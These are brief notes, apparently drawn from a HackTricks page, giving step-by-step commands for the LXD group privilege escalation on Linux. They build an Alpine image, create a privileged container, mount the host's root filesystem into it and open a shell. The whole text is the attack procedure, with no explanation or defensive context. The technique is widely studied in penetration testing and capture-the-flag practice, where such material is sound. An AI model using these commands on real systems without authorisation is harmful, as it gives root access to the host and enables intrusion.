## Source: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

## Steps:

### Attacker: git clone https://github.com/alpinelinux/docker-alpine

### sudo ./build-alpine -a i686

### Transfer to machine for rest of privesc

#### First execute lxc init

#### 1) lxc image list

#### 2) Upload image to target

#### 3) lxc image import <image.tar.gz> --alias myalpine

#### 4) lxc init myalpine jimmy -c security.privileged=true

#### 5) lxc config device add jimmy mydevice disk source=/ path=/mnt/root recursive=true

#### 6) lxc start jimmy

#### 7) lxc exec jimmy /bin/sh

#### 8) GGWP!
